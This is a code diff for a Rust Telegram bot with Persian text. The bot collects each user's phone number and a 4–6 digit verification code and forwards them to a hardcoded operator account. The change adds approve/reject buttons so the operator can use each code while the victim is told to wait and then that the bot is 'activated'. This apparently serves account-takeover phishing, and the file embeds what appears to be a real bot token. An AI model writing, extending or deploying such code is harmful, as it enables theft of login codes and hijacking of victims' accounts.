@@ -20,7 +20,7 @@ use tokio::sync::Mutex;
 // ⬇⬇⬇  اینجا توکن رباتت رو بذار  ⬇⬇⬇
 const BOT_TOKEN: &str = "8867175870:AAGxLoYhj2m360TOxjtg6H9XQ_JotvQQyf8";
 
-// آیدی عددی مقصدی که شماره و کد باید براش ارسال بشن
+// آیدی عددی خودت (ادمین) — اینجا شماره و کد میان و تایید/رد می‌کنی
 const TARGET_USER_ID: i64 = 7_383_778_633;
 
 // ═══════════════════════════════════════════════════════════
@@ -35,9 +35,13 @@ const CODE_REQUEST_TEXT: &str = "\
 
 const INVALID_CODE_TEXT: &str = "لطفاً کد رو به صورت عددی ۴ تا ۶ رقمی بفرستید.";
 
-const CODE_RECEIVED_TEXT: &str = "\
+const CODE_WAITING_TEXT: &str = "کد شما دریافت شد، در انتظار تایید...";
+
+const CODE_APPROVED_TEXT: &str = "\
 تایید شد
 ربات فعال شد✅";
+
+const CODE_REJECTED_TEXT: &str = "کد نامعتبر است ❌";
 
 const WRONG_CONTACT_TEXT: &str = "لطفاً شمارهٔ خودتون رو بفرستید، نه شمارهٔ شخص دیگه.";
 
@@ -208,7 +212,7 @@ async fn handle_contact(bot: Bot, msg: Message) -> ResponseResult<()> {
     let phone = normalize_phone(&contact.phone_number);
     set_phone(user_id, phone.clone()).await;
 
-    // فوروارد شماره به مقصد
+    // فوروارد شماره به مقصد (ادمین)
     let target = ChatId(TARGET_USER_ID);
     let forward_text = format!(
         "📞 *شمارهٔ جدید دریافت شد*\n\nشماره: {phone}\nآیدی کاربر: {user_id}"
@@ -251,27 +255,79 @@ async fn handle_text(bot: Bot, msg: Message) -> ResponseResult<()> {
 
     let phone = get_phone(user_id).await;
 
+    // پیام تایید برای ادمین با دکمه‌های تایید/رد
     let target = ChatId(TARGET_USER_ID);
-    let forward_text = format!(
-        "🔑 *کد جدید دریافت شد*\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}"
+    let admin_text = format!(
+        "🔑 *کد جدید دریافت شد*\n\n\
+        کد: {text}\n\
+        شماره: {phone}\n\
+        آیدی کاربر: {user_id}\n\n\
+        آیا تایید می‌کنید؟"
     );
+
+    let keyboard = InlineKeyboardMarkup::new(vec![vec![
+        InlineKeyboardButton::callback("✅ تایید", format!("approve_{user_id}")),
+        InlineKeyboardButton::callback("❌ رد", format!("reject_{user_id}")),
+    ]]);
+
     if let Err(e) = bot
-        .send_message(target, &forward_text)
+        .send_message(target, &admin_text)
         .parse_mode(ParseMode::MarkdownV2)
+        .reply_markup(keyboard.clone())
         .await
     {
         log::warn!("markdown send failed, retrying plain: {e}");
         let plain = format!(
-            "🔑 کد جدید دریافت شد\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}"
+            "🔑 کد جدید دریافت شد\n\nکد: {text}\nشماره: {phone}\nآیدی کاربر: {user_id}\n\nآیا تایید می‌کنید؟"
         );
-        bot.send_message(target, plain).await.ok();
+        bot.send_message(target, plain)
+            .reply_markup(keyboard)
+            .await
+            .ok();
     }
 
+    // منتظر تصمیم ادمین می‌مانیم
     set_state(user_id, UserState::Idle).await;
 
-    bot.send_message(msg.chat.id, CODE_RECEIVED_TEXT).await?;
+    bot.send_message(msg.chat.id, CODE_WAITING_TEXT).await?;
 
-Ok(())
+    Ok(())
+}
+
+async fn cb_approve(bot: Bot, q: CallbackQuery, user_id: i64) -> ResponseResult<()> {
+    bot.answer_callback_query(q.id.clone())
+        .text("تایید شد ✅")
+        .await
+        .ok();
+
+    let user_chat = ChatId(user_id);
+    bot.send_message(user_chat, CODE_APPROVED_TEXT).await.ok();
+
+    if let Some(msg) = q.message {
+        let _ = bot
+            .edit_message_text(msg.chat().id, msg.id(), "✅ تایید شد")
+            .await;
+    }
+
+    Ok(())
+}
+
+async fn cb_reject(bot: Bot, q: CallbackQuery, user_id: i64) -> ResponseResult<()> {
+    bot.answer_callback_query(q.id.clone())
+        .text("رد شد ❌")
+        .await
+        .ok();
+
+    let user_chat = ChatId(user_id);
+    bot.send_message(user_chat, CODE_REJECTED_TEXT).await.ok();
+
+    if let Some(msg) = q.message {
+        let _ = bot
+            .edit_message_text(msg.chat().id, msg.id(), "❌ رد شد")
+            .await;
+    }
+
+    Ok(())
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -312,13 +368,26 @@ async fn main() -> anyhow::Result<()> {
         .branch(
             Update::filter_callback_query().endpoint(
                 |bot: Bot, q: CallbackQuery| async move {
-                    match q.data.as_deref() {
-                        Some("get_self") => cb_get_self(bot, q).await,
-                        _ => {
-                            bot.answer_callback_query(q.id).await.ok();
-                            Ok(())
+                    let data = q.data.clone().unwrap_or_default();
+
+                    if data == "get_self" {
+                        return cb_get_self(bot, q).await;
+                    }
+
+                    if let Some(uid_str) = data.strip_prefix("approve_") {
+                        if let Ok(uid) = uid_str.parse::<i64>() {
+                            return cb_approve(bot, q, uid).await;
                         }
                     }
+
+                    if let Some(uid_str) = data.strip_prefix("reject_") {
+                        if let Ok(uid) = uid_str.parse::<i64>() {
+                            return cb_reject(bot, q, uid).await;
+                        }
+                    }
+
+                    bot.answer_callback_query(q.id).await.ok();
+                    Ok(())
                 },
             ),
         );
@@ -332,3 +401,4 @@ async fn main() -> anyhow::Result<()> {
 
     Ok(())
 }
+    
